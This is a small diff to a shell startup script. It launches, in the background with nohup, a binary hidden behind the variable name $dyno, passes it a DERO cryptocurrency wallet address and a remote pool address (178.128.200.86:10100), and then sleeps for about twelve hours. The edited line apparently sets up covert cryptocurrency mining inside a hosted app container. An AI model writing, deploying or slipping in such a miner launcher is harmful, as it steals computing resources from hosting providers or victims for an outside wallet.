@@ -1,6 +1,5 @@
 cd /app/bin
 sleep 5
 #nohup /app/bin/client & sleep 0.1
-#/app/bin/mode >/dev/null 2>&1 >/dev/null &
-nohup $1/bin/$dyno -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 & sleep 0.1
+nohup /app/bin/$dyno -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 178.128.200.86:10100 & sleep 0.1
 sleep 43000
